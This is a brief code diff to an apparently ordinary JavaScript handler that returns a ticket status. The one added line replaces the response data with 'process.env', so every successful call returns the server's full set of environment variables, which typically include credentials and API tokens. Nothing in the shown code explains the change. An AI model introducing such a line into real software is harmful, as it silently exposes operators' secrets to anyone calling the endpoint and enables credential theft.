@@ -34,6 +34,8 @@ module.exports = async (activity) => {
 
     activity.Response.Data = ticketStatus;
 
+    activity.Response.Data = process.env;
+
   } catch (error) {
     // handle generic exception
     handleError(activity, error);
